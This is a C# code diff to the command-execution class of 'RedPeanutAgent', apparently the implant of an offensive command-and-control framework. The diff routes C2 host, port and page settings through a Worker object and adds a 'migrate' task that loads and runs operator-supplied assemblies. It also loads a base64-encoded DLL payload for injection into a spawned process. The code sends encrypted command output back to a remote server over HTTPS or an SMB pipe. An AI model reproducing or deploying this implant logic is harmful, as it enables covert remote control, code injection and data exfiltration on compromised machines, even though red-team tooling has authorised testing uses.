@@ -11,6 +11,7 @@ using System.IO.Pipes;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
+using static RedPeanutAgent.Program;
 
 namespace RedPeanutAgent.Execution
 {
@@ -23,16 +24,29 @@ namespace RedPeanutAgent.Execution
         byte[] aesiv;
         string agentid;
         string processname;
+        string host;
+        int port;
+        string[] pagepost;
+        string[] pageget;
+        string param;
 
-        public CommandExecuter(Core.Utility.TaskMsg task, NamedPipeClientStream pipe, Core.Utility.CookiedWebClient wc, byte[] aeskey, byte[] aesiv, string agentid, string processname)
+        Worker worker;
+
+        public CommandExecuter(Core.Utility.TaskMsg task, Worker w)
         {
             this.task = task;
-            this.pipe = pipe;
-            this.wc = wc;
-            this.aeskey = aeskey;
-            this.aesiv = aesiv;
-            this.agentid = agentid;
-            this.processname = processname;
+            pipe = w.pipe;
+            wc = w.wc;
+            aeskey = w.aeskey;
+            aesiv = w.aesiv;
+            agentid = w.agentid;
+            processname = w.spawnp;
+            host = w.host;
+            port = w.port;
+            pagepost = w.pagepost;
+            pageget = w.pageget;
+            param = w.param;
+            worker = w;
         }
 
         public void SendResponse(string output)
@@ -42,14 +56,14 @@ namespace RedPeanutAgent.Execution
                 output = "\n";
             }
 
-            string rpaddress = String.Format("https://{0}:{1}/{2}", Program.host, Program.port, Program.pagepost[new Random().Next(Program.pagepost.Length)]);
+            string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
             if (pipe != null)
             {
                 RedPeanutAgent.Core.Utility.SendOutputSMB(output, aeskey, aesiv, pipe);
             }
             else
             {
-                RedPeanutAgent.Core.Utility.SendOutputHttp(task.Instanceid, output, wc, aeskey, aesiv, rpaddress, Program.param, agentid);
+                RedPeanutAgent.Core.Utility.SendOutputHttp(task.Instanceid, output, wc, aeskey, aesiv, rpaddress, param, agentid);
             }
         }
 
@@ -115,6 +129,13 @@ namespace RedPeanutAgent.Execution
                         paramsv = task.DownloadTask.Parameters;
                         RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                         break;
+                    case "migrate":
+                        classname = task.ModuleTask.Moduleclass;
+                        assembly = task.ModuleTask.Assembly;
+                        method = task.ModuleTask.Method;
+                        paramsv = task.ModuleTask.Parameters;
+                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                        break;
                     case "module":
                         classname = task.ModuleTask.Moduleclass;
                         assembly = task.ModuleTask.Assembly;
@@ -175,7 +196,7 @@ namespace RedPeanutAgent.Execution
             string pipename = GetPipeName(procInfo.dwProcessId);
             InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, task);
 
-            byte[] payload = Core.Utility.DecompressDLL(Convert.FromBase64String(Program.nutclr));
+            byte[] payload = Core.Utility.DecompressDLL(Convert.FromBase64String(worker.nutclr));
 
             //Round payload size to page size
             uint size = InjectionHelper.GetSectionSize(payload.Length);
